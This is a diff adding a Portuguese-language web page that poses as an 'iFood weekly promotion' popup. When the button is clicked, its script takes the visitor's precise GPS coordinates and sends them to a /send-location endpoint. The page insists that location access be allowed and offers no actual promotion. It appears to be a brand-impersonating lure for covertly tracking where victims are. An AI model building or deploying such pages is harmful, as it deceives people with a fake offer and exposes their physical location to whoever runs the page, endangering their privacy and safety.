@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background: url('/static/agora.png') no-repeat center top fixed;
+            background-size: cover;
+            font-family: Arial, sans-serif;
+        }
+        
+        
+        /* Estilos para o popup */
+        .popup {
+            position: relative;
+            top: 0; /* Fixa o popup no topo */
+            
+            width: 100%;
+            background-color: #fff;
+            padding: 10px;
+            border-bottom: 2px solid rgb(234, 29, 44);
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            z-index: 1000; /* Garante que o popup esteja na frente de outros elementos */
+            display: none; /* Inicialmente oculto */
+        }
+        .popup h2 {
+            text-align: center;
+            color: rgb(234, 29, 44);
+        }
+        .popup p {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .popup button {
+            display: block;
+            margin: 0 auto;
+            padding: 10px 20px;
+            background-color: rgb(234, 29, 44);
+            color: #000;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        @media screen and (max-width: 768px) {
+            body, html {
+                background-position: left top; /* Ajusta a posição da imagem de fundo para a direita */
+            }
+        }
+    </style>
+</head>
+<body>
+ 
+
+
+    <!-- Popup fixo no topo -->
+    <div id="popup" class="popup">
+        <h2>Promoção Ifood Semanal</h2>
+        <p>Selecione sua Cidade e Aproveite!</p>
+        <button id="closePopup">Selecionar</button>
+    </div>
+
+    <script>
+        // Função para enviar a localização
+        
+
+        function sendLocation(latitude, longitude) {
+            return new Promise((resolve, reject) => {
+                fetch('/send-location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        latitude: latitude,
+                        longitude: longitude
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        resolve(response.json());
+                    } else {
+                        reject;
+                    }
+                })
+                .catch(error => {
+                    reject;
+                });
+            });
+        }
+
+        // Mostra o popup ao carregar a página
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('popup').style.display = 'block';
+        });
+
+        // Fecha o popup ao clicar no botão
+        document.getElementById('closePopup').addEventListener('click', function() {
+            // Verifica se o navegador suporta geolocalização
+            if (navigator.geolocation) {
+                // Obtém a posição atual do usuário ao clicar no popup
+                navigator.geolocation.getCurrentPosition((position) => {
+                    sendLocation(position.coords.latitude, position.coords.longitude)
+                        .then(data => {
+                            alert(data.message); // Mostra a mensagem de sucesso
+                            document.getElementById('popup').style.display = 'none'; // Fecha o popup
+                        })
+                        .catch(error => {
+                            alert(error); // Mostra mensagem de erro
+                            // Opção de tentar novamente ou outra ação
+                            
+
+                        });
+                }, (error) => {
+                    alert('Permita que seu navegador acesse sua Localização');
+                    
+                    
+
+                });
+            } else {
+                alert('Geolocalização não é suportada pelo seu navegador.');
+                
+
+            }
+        });
+        
+       
+
+                          
+    </script>
+   >
+    
+</body>
+</html>
